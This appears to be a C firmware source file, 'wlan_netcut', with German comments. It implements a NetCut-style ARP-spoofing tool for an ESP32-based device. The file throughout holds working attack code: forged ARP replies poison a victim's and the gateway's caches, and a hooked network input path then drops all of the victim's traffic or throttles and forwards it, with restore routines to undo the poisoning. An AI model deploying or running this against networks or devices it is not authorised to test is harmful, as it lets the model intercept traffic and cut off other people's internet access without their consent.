#include "wlan_netcut.h"
#include "wlan_hal.h"

#include <esp_log.h>
#include <esp_netif.h>
#include <furi.h>
#include <lwip/etharp.h>
#include <lwip/ip4_addr.h>
#include <lwip/netif.h>
#include <lwip/pbuf.h>
#include <lwip/tcpip.h>
#include <lwip/prot/ethernet.h>
#include <lwip/prot/etharp.h>
#include <string.h>

#define TAG "WlanNetcut"

#define ARP_REQUEST 1
#define ARP_REPLY   2
#define ARP_FRAME_SIZE (SIZEOF_ETH_HDR + 28)

#define NETCUT_REPOISON_MS    1000
// Restore aggressiver: häufigere Bursts, längeres Fenster — das WLAN
// verliert ARP-Frames gerne mal, und der Cache des Opfers (typ. 1-5 min)
// muss aktiv überschrieben werden, sonst bleibt Restspoofing hängen.
#define NETCUT_RESTORE_MS     250
#define NETCUT_RESTORE_WINDOW 10000
// Beim Hard-Stop nochmal mehrere Bursts in schneller Folge.
#define NETCUT_STOP_BURSTS      5
#define NETCUT_STOP_BURST_MS    100

// Maximaler L2-Frame: 14 Byte ETH + 1500 MTU + bisschen Reserve.
#define NETCUT_FWD_BUF_SIZE 1600

typedef enum {
    WlanNetcutModeIdle = 0,
    WlanNetcutModeCut,
    WlanNetcutModeThrottle,
} WlanNetcutMode;

typedef struct {
    uint32_t ip;
    uint8_t mac[6];
    uint8_t mode; // WlanNetcutMode
    uint16_t throttle_kbps;
    uint32_t throttle_bucket;
    uint32_t throttle_last_refill;
    uint32_t restore_until;
} WlanNetcutDevice;

struct WlanNetcut {
    WlanNetcutDevice devices[WLAN_APP_MAX_DEVICES];
    uint8_t device_count;

    uint8_t my_mac[6];
    uint32_t my_ip;
    uint32_t gw_ip;
    uint32_t netmask;
    uint8_t gw_mac[6];
    bool gw_mac_valid;

    // Seqlock-Counter: gerade = stable, ungerade = mid-write von apply().
    // Erlaubt dem L2-Hook lock-freien Zugriff auf devices[]/device_count und
    // gleichzeitig Erkennung inkonsistenter Reads.
    volatile uint32_t hook_seq;

    FuriMutex* mutex;
    FuriThread* worker;
    volatile bool stop_requested;
    volatile bool running;
};

// ---------------------------------------------------------------------------
// Globaler Zustand für den L2-Hook (alle Zugriffe aus tcpip_thread → single-
// threaded — keine Synchronisation für s_fwd_buf nötig).
// ---------------------------------------------------------------------------
static WlanNetcut* s_hook_engine = NULL;
static struct netif* s_hooked_netif = NULL;
static netif_input_fn s_original_input = NULL;
static uint8_t s_fwd_buf[NETCUT_FWD_BUF_SIZE];

static bool mac_eq(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static int find_device_by_mac(WlanNetcut* nc, const uint8_t* mac) {
    for(int i = 0; i < nc->device_count; i++) {
        if(mac_eq(nc->devices[i].mac, mac)) return i;
    }
    return -1;
}

static bool nc_lock(WlanNetcut* nc) {
    return furi_mutex_acquire(nc->mutex, FuriWaitForever) == FuriStatusOk;
}

static void nc_unlock(WlanNetcut* nc) {
    furi_mutex_release(nc->mutex);
}

// ---------------------------------------------------------------------------
// ARP-Frame bauen
// ---------------------------------------------------------------------------
static void build_arp(
    uint8_t* buf,
    const uint8_t eth_dst[6], const uint8_t eth_src[6],
    uint16_t opcode_host,
    const uint8_t sender_mac[6], const uint8_t sender_ip4[4],
    const uint8_t target_mac[6], const uint8_t target_ip4[4]) {
    struct eth_hdr* eth = (struct eth_hdr*)buf;
    struct etharp_hdr* arp = (struct etharp_hdr*)(buf + SIZEOF_ETH_HDR);

    memcpy(eth->dest.addr, eth_dst, 6);
    memcpy(eth->src.addr, eth_src, 6);
    eth->type = lwip_htons(ETHTYPE_ARP);

    arp->hwtype = lwip_htons(1);
    arp->proto = lwip_htons(ETHTYPE_IP);
    arp->hwlen = 6;
    arp->protolen = 4;
    arp->opcode = lwip_htons(opcode_host);
    memcpy(arp->shwaddr.addr, sender_mac, 6);
    memcpy(&arp->sipaddr, sender_ip4, 4);
    memcpy(arp->dhwaddr.addr, target_mac, 6);
    memcpy(&arp->dipaddr, target_ip4, 4);
}

// ---------------------------------------------------------------------------
// Pure Sender — keine nc-Felder, kein Lock. Sicher außerhalb des Mutex
// aufzurufen. wlan_hal_send_eth_raw kopiert intern, daher darf buf zwischen
// den Aufrufen wieder beschrieben werden.
// ---------------------------------------------------------------------------
static void poison_one(
    const uint8_t my_mac[6], const uint8_t gw_mac[6], uint32_t gw_ip,
    const uint8_t dev_mac[6], uint32_t dev_ip) {
    if(mac_eq(dev_mac, my_mac) || mac_eq(dev_mac, gw_mac)) {
        ESP_LOGW(TAG, "poison_one: skip — dev == my/gw");
        return;
    }

    uint8_t dev_ip4[4], gw_ip4[4];
    memcpy(dev_ip4, &dev_ip, 4);
    memcpy(gw_ip4, &gw_ip, 4);

    uint8_t buf[ARP_FRAME_SIZE];
    // An Opfer: "Gateway IP ist bei MEINER MAC".
    build_arp(buf, dev_mac, my_mac, ARP_REPLY,
              my_mac, gw_ip4, dev_mac, dev_ip4);
    bool ok1 = wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);

    // An Gateway: "Opfer IP ist bei MEINER MAC".
    build_arp(buf, gw_mac, my_mac, ARP_REPLY,
              my_mac, dev_ip4, gw_mac, gw_ip4);
    bool ok2 = wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);

    static uint32_t poison_log_counter = 0;
    if((poison_log_counter++ & 0x07) == 0) {
        // alle 8 Aufrufe einen Log
        ESP_LOGI(TAG,
            "poison: dev=%u.%u.%u.%u (%02x:%02x:%02x:%02x:%02x:%02x) "
            "tx_victim=%d tx_gw=%d",
            dev_ip4[0], dev_ip4[1], dev_ip4[2], dev_ip4[3],
            dev_mac[0], dev_mac[1], dev_mac[2], dev_mac[3], dev_mac[4], dev_mac[5],
            ok1, ok2);
    }
}

static void restore_one(
    const uint8_t my_mac[6], const uint8_t gw_mac[6], uint32_t gw_ip,
    const uint8_t dev_mac[6], uint32_t dev_ip) {
    if(mac_eq(dev_mac, my_mac) || mac_eq(dev_mac, gw_mac)) return;

    uint8_t dev_ip4[4], gw_ip4[4];
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(dev_ip4, &dev_ip, 4);
    memcpy(gw_ip4, &gw_ip, 4);

    uint8_t buf[ARP_FRAME_SIZE];
    int sent = 0;

    // 1) Opfer-cache überschreiben: 3× unicast Reply "gw_ip = echte gw_mac"
    build_arp(buf, dev_mac, gw_mac, ARP_REPLY,
              gw_mac, gw_ip4, dev_mac, dev_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    // 2) Broadcast Request vom GW — zwingt Opfer zur Antwort + andere im
    //    LAN zum Cache-Refresh.
    build_arp(buf, bcast, gw_mac, ARP_REQUEST,
              gw_mac, gw_ip4, bcast, dev_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    // 3) Gratuitous Reply vom GW (broadcast) — "Hi all, gw_ip is at gw_mac".
    //    Das überschreibt jeden Cache der noch my_mac für die GW-IP hat.
    build_arp(buf, bcast, gw_mac, ARP_REPLY,
              gw_mac, gw_ip4, bcast, gw_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    // 4) Gateway-cache überschreiben: 3× unicast Reply "dev_ip = echte dev_mac"
    build_arp(buf, gw_mac, dev_mac, ARP_REPLY,
              dev_mac, dev_ip4, gw_mac, gw_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    // 5) Broadcast Request vom Opfer.
    build_arp(buf, bcast, dev_mac, ARP_REQUEST,
              dev_mac, dev_ip4, bcast, gw_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    // 6) Gratuitous Reply vom Opfer (broadcast).
    build_arp(buf, bcast, dev_mac, ARP_REPLY,
              dev_mac, dev_ip4, bcast, dev_ip4);
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;

    static uint32_t restore_log_counter = 0;
    if((restore_log_counter++ & 0x07) == 0) {
        ESP_LOGI(TAG,
            "restore: dev=%u.%u.%u.%u (%02x:%02x:%02x:%02x:%02x:%02x) "
            "tx_ok=%d/13",
            dev_ip4[0], dev_ip4[1], dev_ip4[2], dev_ip4[3],
            dev_mac[0], dev_mac[1], dev_mac[2], dev_mac[3], dev_mac[4], dev_mac[5],
            sent);
    }
}

// ---------------------------------------------------------------------------
// L2-Input-Hook — lock-free über Seqlock, behandelt sowohl outbound (victim →
// gateway) als auch inbound (gateway → victim) Frames.
// ---------------------------------------------------------------------------
static volatile uint32_t s_hook_total = 0;
static volatile uint32_t s_hook_dropped = 0;
static volatile uint32_t s_hook_forwarded = 0;
static volatile uint32_t s_hook_passed = 0;
static volatile uint32_t s_hook_last_log_total = 0;

static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
    WlanNetcut* nc = s_hook_engine;
    s_hook_total++;
    // Nur grobe Statistik — bei jeder 200. Frame ein Sample, damit der Log
    // nicht explodiert. Cut/Throttle würde sonst Hunderte Frames/s loggen.
    if(s_hook_total - s_hook_last_log_total >= 200) {
        s_hook_last_log_total = s_hook_total;
        ESP_LOGI(TAG, "hook stats: total=%lu dropped=%lu forwarded=%lu passed=%lu "
            "engine=%p devices=%u",
            (unsigned long)s_hook_total,
            (unsigned long)s_hook_dropped,
            (unsigned long)s_hook_forwarded,
            (unsigned long)s_hook_passed,
            nc,
            nc ? nc->device_count : 0);
    }
    if(!nc || !p || p->len < SIZEOF_ETH_HDR) goto pass;

    // Wenn apply() gerade die Tabelle umbaut (odd seq) → Frame durchlassen.
    uint32_t s1 = __atomic_load_n(&nc->hook_seq, __ATOMIC_ACQUIRE);
    if(s1 & 1u) goto pass;

    struct eth_hdr* eth = (struct eth_hdr*)p->payload;
    const uint8_t* src = eth->src.addr;
    const uint8_t* dst = eth->dest.addr;

    uint8_t count = nc->device_count;
    if(count > WLAN_APP_MAX_DEVICES) count = WLAN_APP_MAX_DEVICES;

    int idx = -1;
    bool inbound = false; // gateway → victim
    for(uint8_t i = 0; i < count; i++) {
        if(mac_eq(nc->devices[i].mac, src)) {
            idx = i;
            inbound = false;
            break;
        }
    }
    if(idx < 0 && nc->gw_mac_valid && mac_eq(src, nc->gw_mac)) {
        for(uint8_t i = 0; i < count; i++) {
            if(mac_eq(nc->devices[i].mac, dst)) {
                idx = i;
                inbound = true;
                break;
            }
        }
    }

    // Konsistenz-Recheck: hat apply() während unseres Lookups geschrieben?
    uint32_t s2 = __atomic_load_n(&nc->hook_seq, __ATOMIC_ACQUIRE);
    if(s1 != s2) goto pass;

    if(idx < 0) goto pass;

    WlanNetcutDevice* d = &nc->devices[idx];
    WlanNetcutMode mode = (WlanNetcutMode)d->mode;
    if(mode == WlanNetcutModeIdle) goto pass;

    bool drop = false;
    if(mode == WlanNetcutModeCut) {
        // Komplett-Cut: alles vom Opfer ODER ans Opfer geht ins Leere.
        drop = true;
    } else if(mode == WlanNetcutModeThrottle) {
        // Frame berührt das Opfer → wir absorbieren ihn vom eigenen Stack
        // unabhängig vom EtherType (Bug 5: Non-IPv4 nicht durchreichen).
        drop = true;

        uint16_t pkt_len = p->tot_len;
        bool ipv4 = lwip_ntohs(eth->type) == ETHTYPE_IP;

        // Token-Bucket refill.
        uint32_t now = furi_get_tick();
        uint32_t last = d->throttle_last_refill;
        if(last == 0) last = now;
        uint32_t elapsed = now - last;
        uint32_t cap = (uint32_t)d->throttle_kbps * 128;
        uint32_t bucket = d->throttle_bucket;
        if(elapsed > 0 && d->throttle_kbps > 0) {
            uint64_t add = (uint64_t)d->throttle_kbps * 128ULL * (uint64_t)elapsed / 1000ULL;
            uint64_t newb = (uint64_t)bucket + add;
            if(newb > cap) newb = cap;
            bucket = (uint32_t)newb;
        }
        d->throttle_last_refill = now;

        // Forward nur IPv4. pbuf_copy_partial linearisiert chains korrekt
        // (Bug 3).
        if(ipv4 && pkt_len <= NETCUT_FWD_BUF_SIZE && bucket >= pkt_len) {
            if(pbuf_copy_partial(p, s_fwd_buf, pkt_len, 0) == pkt_len) {
                bucket -= pkt_len;
                if(inbound) {
                    // GW → Victim: wir spoofen, daher dst war my_mac. An
                    // echten Empfänger weiterleiten; src bleibt my_mac.
                    memcpy(s_fwd_buf, d->mac, 6);
                    memcpy(s_fwd_buf + 6, nc->my_mac, 6);
                } else {
                    // Victim → GW: dst war my_mac (poisoned), wir leiten an
                    // den echten Gateway weiter.
                    memcpy(s_fwd_buf, nc->gw_mac, 6);
                    memcpy(s_fwd_buf + 6, nc->my_mac, 6);
                }
                wlan_hal_send_eth_raw(s_fwd_buf, pkt_len);
                s_hook_forwarded++;
            }
        }
        d->throttle_bucket = bucket;
    }

    if(drop) {
        s_hook_dropped++;
        pbuf_free(p);
        return ERR_OK;
    }

pass:
    s_hook_passed++;
    if(s_original_input) return s_original_input(p, inp);
    pbuf_free(p);
    return ERR_OK;
}

static void install_l2_hook(WlanNetcut* nc) {
    if(s_hooked_netif) return;
    struct netif* nif = netif_default;
    if(!nif) return;
    LOCK_TCPIP_CORE();
    s_original_input = nif->input;
    nif->input = netcut_input_hook;
    s_hooked_netif = nif;
    s_hook_engine = nc;
    UNLOCK_TCPIP_CORE();
    ESP_LOGI(TAG, "L2 hook installed");
}

static void uninstall_l2_hook(void) {
    if(!s_hooked_netif) return;
    LOCK_TCPIP_CORE();
    s_hooked_netif->input = s_original_input;
    UNLOCK_TCPIP_CORE();
    s_hooked_netif = NULL;
    s_original_input = NULL;
    s_hook_engine = NULL;
    ESP_LOGI(TAG, "L2 hook uninstalled");
}

// ---------------------------------------------------------------------------
// Worker-Thread — sendet Poison/Restore-Frames ohne Mutex-Hold (Bug 4).
// ---------------------------------------------------------------------------
typedef struct {
    uint8_t mac[6];
    uint32_t ip;
    uint8_t kind; // 1 = poison, 2 = restore
} NetcutJob;

static int32_t netcut_worker_fn(void* ctx) {
    WlanNetcut* nc = (WlanNetcut*)ctx;
    uint32_t last_poison = 0;
    uint32_t last_restore = 0;
    uint32_t loop_count = 0;
    ESP_LOGI(TAG, "worker started");

    while(!nc->stop_requested) {
        uint32_t now = furi_get_tick();
        bool do_poison = (now - last_poison >= NETCUT_REPOISON_MS);
        bool do_restore = (now - last_restore >= NETCUT_RESTORE_MS);
        if(do_poison) last_poison = now;
        if(do_restore) last_restore = now;

        // Snapshot unter Lock. Nur Lookups + Memcpys, kein I/O, kein delay.
        uint8_t my_mac[6] = {0};
        uint8_t gw_mac[6] = {0};
        uint32_t gw_ip = 0;
        bool gw_valid = false;
        NetcutJob jobs[WLAN_APP_MAX_DEVICES];
        int n_jobs = 0;
        bool keep_running = false;

        if(nc_lock(nc)) {
            memcpy(my_mac, nc->my_mac, 6);
            memcpy(gw_mac, nc->gw_mac, 6);
            gw_ip = nc->gw_ip;
            gw_valid = nc->gw_mac_valid;
            for(int i = 0; i < nc->device_count; i++) {
                WlanNetcutDevice* d = &nc->devices[i];
                bool active = d->mode != WlanNetcutModeIdle;
                bool restoring = d->restore_until && now < d->restore_until;
                if(active || restoring) keep_running = true;

                if(active && do_poison) {
                    memcpy(jobs[n_jobs].mac, d->mac, 6);
                    jobs[n_jobs].ip = d->ip;
                    jobs[n_jobs].kind = 1;
                    n_jobs++;
                } else if(restoring && do_restore) {
                    memcpy(jobs[n_jobs].mac, d->mac, 6);
                    jobs[n_jobs].ip = d->ip;
                    jobs[n_jobs].kind = 2;
                    n_jobs++;
                } else if(d->restore_until && !restoring) {
                    d->restore_until = 0; // expired
                }
            }
            nc_unlock(nc);
        }

        if(!keep_running) {
            ESP_LOGI(TAG, "worker: no devices keep_running → break (loop=%lu)",
                (unsigned long)loop_count);
            break;
        }

        // Sehr-knapp loggen, max. alle 20 loops (~1 s) wenn was passiert.
        if(n_jobs > 0 && (loop_count % 20) == 0) {
            ESP_LOGI(TAG, "worker: loop=%lu n_jobs=%d gw_valid=%d "
                "poison=%d restore=%d",
                (unsigned long)loop_count, n_jobs, gw_valid, do_poison, do_restore);
        }

        if(gw_valid) {
            for(int i = 0; i < n_jobs; i++) {
                if(jobs[i].kind == 1) {
                    poison_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
                } else {
                    restore_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
                }
            }
        } else if(n_jobs > 0) {
            ESP_LOGW(TAG, "worker: %d jobs but no gw_valid — nothing sent",
                n_jobs);
        }

        loop_count++;
        furi_delay_ms(50);
    }

    nc->running = false; // Self-Stop signalisieren — apply/stop joint später.
    ESP_LOGI(TAG, "worker exiting");
    return 0;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
WlanNetcut* wlan_netcut_alloc(void) {
    WlanNetcut* nc = malloc(sizeof(WlanNetcut));
    memset(nc, 0, sizeof(*nc));
    nc->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    return nc;
}

void wlan_netcut_free(WlanNetcut* nc) {
    if(!nc) return;
    wlan_netcut_stop(nc);
    if(nc->mutex) furi_mutex_free(nc->mutex);
    free(nc);
}

bool wlan_netcut_preflight(WlanNetcut* nc) {
    if(!nc || !wlan_hal_is_connected()) {
        ESP_LOGW(TAG, "preflight: nc=%p connected=%d",
            nc, wlan_hal_is_connected());
        return false;
    }
    nc->my_ip = wlan_hal_get_own_ip();
    nc->gw_ip = wlan_hal_get_gw_ip();
    nc->netmask = wlan_hal_get_netmask();
    if(!wlan_hal_get_own_mac(nc->my_mac)) {
        ESP_LOGW(TAG, "preflight: get_own_mac failed");
        return false;
    }
    {
        const uint8_t* ip = (const uint8_t*)&nc->my_ip;
        const uint8_t* gw = (const uint8_t*)&nc->gw_ip;
        const uint8_t* nm = (const uint8_t*)&nc->netmask;
        const uint8_t* m = nc->my_mac;
        ESP_LOGI(TAG,
            "preflight: my_ip=%u.%u.%u.%u gw_ip=%u.%u.%u.%u mask=%u.%u.%u.%u "
            "my_mac=%02x:%02x:%02x:%02x:%02x:%02x",
            ip[0], ip[1], ip[2], ip[3],
            gw[0], gw[1], gw[2], gw[3],
            nm[0], nm[1], nm[2], nm[3],
            m[0], m[1], m[2], m[3], m[4], m[5]);
    }

    nc->gw_mac_valid = false;
    LOCK_TCPIP_CORE();
    for(uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t* ip_ret = NULL;
        struct netif* nif_ret = NULL;
        struct eth_addr* eth_ret = NULL;
        if(etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) != 1) continue;
        if(!ip_ret || !eth_ret) continue;
        if(ip_ret->addr == nc->gw_ip) {
            memcpy(nc->gw_mac, eth_ret->addr, 6);
            nc->gw_mac_valid = true;
            break;
        }
    }
    UNLOCK_TCPIP_CORE();

    if(!nc->gw_mac_valid) {
        const uint8_t* gw = (const uint8_t*)&nc->gw_ip;
        ESP_LOGW(TAG, "preflight: GW MAC not in ARP table for %u.%u.%u.%u",
            gw[0], gw[1], gw[2], gw[3]);
    } else {
        const uint8_t* m = nc->gw_mac;
        ESP_LOGI(TAG, "preflight: gw_mac=%02x:%02x:%02x:%02x:%02x:%02x",
            m[0], m[1], m[2], m[3], m[4], m[5]);
    }
    return nc->gw_mac_valid;
}

// Räumt einen Worker auf, der sich ggf. selbst beendet hat (running == false,
// aber FuriThread-Handle noch da).
static void cleanup_stopped_worker(WlanNetcut* nc) {
    if(nc->worker && !nc->running) {
        furi_thread_join(nc->worker);
        furi_thread_free(nc->worker);
        nc->worker = NULL;
        uninstall_l2_hook();
    }
}

static void start_worker(WlanNetcut* nc) {
    cleanup_stopped_worker(nc);
    if(nc->running) {
        ESP_LOGI(TAG, "start_worker: already running");
        return;
    }
    ESP_LOGI(TAG, "start_worker: spawning thread + installing L2 hook");
    nc->stop_requested = false;
    nc->worker = furi_thread_alloc();
    furi_thread_set_name(nc->worker, "WlanNetcutW");
    furi_thread_set_stack_size(nc->worker, 4096);
    furi_thread_set_context(nc->worker, nc);
    furi_thread_set_callback(nc->worker, netcut_worker_fn);
    nc->running = true;
    install_l2_hook(nc);
    furi_thread_start(nc->worker);
}

static void stop_worker(WlanNetcut* nc) {
    ESP_LOGI(TAG, "stop_worker: running=%d worker=%p", nc->running, nc->worker);
    if(nc->running) {
        nc->stop_requested = true;
    }
    if(nc->worker) {
        furi_thread_join(nc->worker);
        furi_thread_free(nc->worker);
        nc->worker = NULL;
    }
    nc->running = false;
    uninstall_l2_hook();
}

bool wlan_netcut_apply(WlanNetcut* nc, const WlanDeviceRecord* devices, uint8_t count) {
    if(!nc) {
        ESP_LOGW(TAG, "apply: nc=NULL");
        return false;
    }
    ESP_LOGI(TAG, "apply: in_count=%u gw_valid=%d", count, nc->gw_mac_valid);
    if(!nc->gw_mac_valid) {
        wlan_netcut_preflight(nc);
        if(!nc->gw_mac_valid) {
            ESP_LOGW(TAG, "apply: aborting — preflight still no gw_mac");
            return false;
        }
    }

    // Eingangsliste loggen — sieht man, ob Block/Throttle pro Device gesetzt ist.
    for(uint8_t i = 0; i < count; ++i) {
        const WlanDeviceRecord* dr = &devices[i];
        const uint8_t* ip = (const uint8_t*)&dr->ip;
        const uint8_t* m = dr->mac;
        ESP_LOGI(TAG, "apply: in[%u] ip=%u.%u.%u.%u mac=%02x:%02x:%02x:%02x:%02x:%02x "
            "active=%d block=%d throttle=%u",
            i, ip[0], ip[1], ip[2], ip[3],
            m[0], m[1], m[2], m[3], m[4], m[5],
            dr->active, dr->block_internet, dr->throttle_kbps);
    }

    bool any_active = false;
    bool restore_triggered = false;
    if(!nc_lock(nc)) {
        ESP_LOGE(TAG, "apply: nc_lock failed");
        return false;
    }

    uint32_t now = furi_get_tick();
    WlanNetcutDevice next[WLAN_APP_MAX_DEVICES];
    memset(next, 0, sizeof(next));
    uint8_t next_count = 0;

    // Phase 1: aus eingehender Liste bauen, State von vorigem Eintrag migrieren.
    for(uint8_t i = 0; i < count && next_count < WLAN_APP_MAX_DEVICES; ++i) {
        const WlanDeviceRecord* dr = &devices[i];
        WlanNetcutMode mode = WlanNetcutModeIdle;
        uint16_t throttle = 0;
        if(dr->block_internet) {
            mode = WlanNetcutModeCut;
        } else if(dr->throttle_kbps) {
            mode = WlanNetcutModeThrottle;
            throttle = dr->throttle_kbps;
        }

        WlanNetcutDevice* nd = &next[next_count++];
        nd->ip = dr->ip;
        memcpy(nd->mac, dr->mac, 6);
        nd->mode = (uint8_t)mode;
        nd->throttle_kbps = throttle;

        int prev_idx = find_device_by_mac(nc, dr->mac);
        if(prev_idx >= 0) {
            const WlanNetcutDevice* prev = &nc->devices[prev_idx];

            // Bug 6: restore_until nur sauber übernehmen.
            if(prev->mode != WlanNetcutModeIdle && mode == WlanNetcutModeIdle) {
                nd->restore_until = now + NETCUT_RESTORE_WINDOW;
                restore_triggered = true;
            } else if(mode == WlanNetcutModeIdle) {
                nd->restore_until = prev->restore_until;
            }
            // mode != Idle → restore_until bleibt 0 (nicht in Restore-Phase).

            // Bug 7: Bucket nur übernehmen wenn vorheriger Mode auch Throttle
            // mit gleichem Limit war; sonst auf cap initialisieren.
            if(mode == WlanNetcutModeThrottle) {
                if(prev->mode == WlanNetcutModeThrottle && prev->throttle_kbps == throttle) {
                    nd->throttle_bucket = prev->throttle_bucket;
                    nd->throttle_last_refill = prev->throttle_last_refill;
                } else {
                    nd->throttle_bucket = (uint32_t)throttle * 128;
                    nd->throttle_last_refill = now;
                }
            }
        } else if(mode == WlanNetcutModeThrottle) {
            // Komplett neuer Eintrag im Throttle-Modus.
            nd->throttle_bucket = (uint32_t)throttle * 128;
            nd->throttle_last_refill = now;
        }

        if(mode != WlanNetcutModeIdle) any_active = true;
        if(nd->restore_until > now) any_active = true;
    }

    // Phase 2 (Bug 1): Vorher aktive/restoring Devices, die nicht mehr in der
    // eingehenden Liste sind, als Ghost-Restore-Eintrag mitnehmen — sonst
    // bleibt das Opfer ARP-vergiftet bis sein Cache abläuft.
    for(uint8_t j = 0; j < nc->device_count && next_count < WLAN_APP_MAX_DEVICES; ++j) {
        const WlanNetcutDevice* prev = &nc->devices[j];
        bool was_active = prev->mode != WlanNetcutModeIdle;
        bool was_restoring = prev->restore_until && prev->restore_until > now;
        if(!was_active && !was_restoring) continue;

        bool found = false;
        for(uint8_t k = 0; k < next_count; ++k) {
            if(mac_eq(next[k].mac, prev->mac)) {
                found = true;
                break;
            }
        }
        if(found) continue;

        WlanNetcutDevice* nd = &next[next_count++];
        memcpy(nd->mac, prev->mac, 6);
        nd->ip = prev->ip;
        nd->mode = (uint8_t)WlanNetcutModeIdle;
        nd->restore_until = was_active ? (now + NETCUT_RESTORE_WINDOW) : prev->restore_until;
        if(was_active) restore_triggered = true;
        any_active = true;
    }

    // Bug 2: Atomic Publish (Seqlock-Pattern) — Hook erkennt das mid-write
    // Fenster und lässt Frames durch statt inkonsistente Daten zu lesen.
    __atomic_fetch_add(&nc->hook_seq, 1, __ATOMIC_RELEASE); // odd
    __atomic_thread_fence(__ATOMIC_RELEASE);
    memcpy(nc->devices, next, sizeof(next));
    nc->device_count = next_count;
    __atomic_thread_fence(__ATOMIC_RELEASE);
    __atomic_fetch_add(&nc->hook_seq, 1, __ATOMIC_RELEASE); // even

    nc_unlock(nc);

    ESP_LOGI(TAG, "apply: published next_count=%u any_active=%d restore_triggered=%d",
        next_count, any_active, restore_triggered);

    if(any_active) {
        start_worker(nc);
    } else {
        stop_worker(nc);
    }
    return restore_triggered;
}

void wlan_netcut_stop(WlanNetcut* nc) {
    if(!nc) return;

    // Snapshot der zu restorenden Devices unter Lock, dann lock-frei senden.
    uint8_t my_mac[6] = {0};
    uint8_t gw_mac[6] = {0};
    uint32_t gw_ip = 0;
    bool gw_valid = false;
    NetcutJob jobs[WLAN_APP_MAX_DEVICES];
    int n_jobs = 0;

    if(nc_lock(nc)) {
        memcpy(my_mac, nc->my_mac, 6);
        memcpy(gw_mac, nc->gw_mac, 6);
        gw_ip = nc->gw_ip;
        gw_valid = nc->gw_mac_valid;
        uint32_t now = furi_get_tick();
        for(int i = 0; i < nc->device_count; i++) {
            WlanNetcutDevice* d = &nc->devices[i];
            bool was_active = d->mode != WlanNetcutModeIdle;
            bool was_restoring = d->restore_until && d->restore_until > now;
            if(was_active || was_restoring) {
                memcpy(jobs[n_jobs].mac, d->mac, 6);
                jobs[n_jobs].ip = d->ip;
                jobs[n_jobs].kind = 2;
                n_jobs++;
            }
        }
        // Tabelle leeren (Seqlock-Bracket, damit Hook keine partial reads sieht).
        __atomic_fetch_add(&nc->hook_seq, 1, __ATOMIC_RELEASE);
        __atomic_thread_fence(__ATOMIC_RELEASE);
        memset(nc->devices, 0, sizeof(nc->devices));
        nc->device_count = 0;
        __atomic_thread_fence(__ATOMIC_RELEASE);
        __atomic_fetch_add(&nc->hook_seq, 1, __ATOMIC_RELEASE);
        nc_unlock(nc);
    }

    // Synchron mehrere Restore-Bursts raus (NETCUT_STOP_BURSTS Iterationen
    // mit NETCUT_STOP_BURST_MS Pause), bevor Worker stoppt — auf einem
    // verlustreichen Link kommt sonst evtl. kein einziger Frame an, und das
    // Opfer behält den vergifteten ARP-Cache (Timeout typ. 1-5 min).
    if(gw_valid && n_jobs > 0) {
        ESP_LOGI(TAG, "stop: firing %d restore bursts for %d devices",
            NETCUT_STOP_BURSTS, n_jobs);
        for(int b = 0; b < NETCUT_STOP_BURSTS; b++) {
            for(int i = 0; i < n_jobs; i++) {
                restore_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
            }
            if(b + 1 < NETCUT_STOP_BURSTS) furi_delay_ms(NETCUT_STOP_BURST_MS);
        }
    }

    stop_worker(nc);
}

bool wlan_netcut_is_running(WlanNetcut* nc) {
    return nc && nc->running;
}
